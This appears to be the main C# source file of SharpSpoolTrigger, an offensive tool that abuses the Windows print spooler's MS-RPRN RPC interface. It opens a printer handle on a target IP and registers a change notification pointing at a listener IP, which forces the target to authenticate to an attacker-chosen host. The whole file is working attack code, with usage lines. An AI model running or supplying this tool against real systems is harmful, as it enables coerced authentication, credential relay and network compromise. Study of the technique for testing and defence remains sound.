using System;
using static SharpSpoolTrigger.NativeMethods;

namespace SharpSpoolTrigger
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("usage: SharpSpoolTrigger.exe <Target IP> <Listener IP>");
                Console.WriteLine("usage: SharpSpoolTrigger.exe 192.168.1.10 192.168.1.250");
                return;
            }
            if (IntPtr.Size == 8)
            {
                Console.WriteLine("NdrClientCall2x64");
            }
            else
            {
                Console.WriteLine("CallNdrClientCall2x86");
            }

            var Rprn = new rprn();
            IntPtr hHandle = IntPtr.Zero;
            var devmodeContainer = new DEVMODE_CONTAINER();

            try
            {
                var ret = Rprn.RpcOpenPrinter("\\\\" + args[0], out hHandle, null, ref devmodeContainer, 0);
                if (ret != 0)
                {
                    Console.WriteLine($"[-]RpcOpenPrinter status: {ret}");
                    return;
                }
                ret = Rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(hHandle, 0x00000100, 0, "\\\\" + args[1], 0);
                if (ret != 0)
                {
                    Console.WriteLine($"[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: {ret}");
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
            finally
            {
                if (hHandle != IntPtr.Zero)
                    Rprn.RpcClosePrinter(ref hHandle);
            }
        }
    }
}